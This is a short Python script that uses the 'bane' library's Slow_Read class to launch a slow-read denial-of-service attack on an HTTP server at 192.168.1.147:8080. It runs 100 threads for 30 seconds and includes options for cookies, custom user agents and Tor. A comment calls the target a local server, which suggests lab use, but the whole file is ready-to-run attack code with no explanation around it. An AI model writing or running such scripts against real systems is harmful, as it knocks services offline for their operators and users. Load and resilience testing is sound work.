from bane.ddos import Slow_Read

def main():
    try:
        # Create an instance of Slow_Read
        slow_read = Slow_Read(
            u="192.168.1.147",  # Target URL (your local server)
            p=8080,  # Target port
            cookie="SessionID=12345",  # Optional cookies
            user_agents=["Mozilla/5.0", "CustomUserAgent/1.0"],  # Custom user-agent headers
            paths=["/", "/path"],  # Paths to target
            threads_daemon=True,  # Set threads as daemons
            threads=100,  # Number of threads
            timeout=5,  # Timeout for HTTP requests
            min_speed=3,  # Minimum speed for reading data (seconds)
            max_speed=5,  # Maximum speed for reading data (seconds)
            min_read=1,  # Minimum number of bytes to read
            max_read=3,  # Maximum number of bytes to read
            logs=True,  # Enable logging
            tor=False,  # Do not use Tor network
            duration=30,  # Duration of the attack in seconds
            ssl_on=False  # SSL/TLS not enabled
        )

        print("[*] Starting slow read attack...")
        slow_read.attack()  # Launch the slow read attack

        import time
        time.sleep(30)  # Let it run for the specified duration

        # Stop the attack manually if needed
        print("[*] Stopping slow read attack...")
        slow_read.stop = True  # Graceful termination of the attack

        print("[*] Slow read attack stopped.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    main()
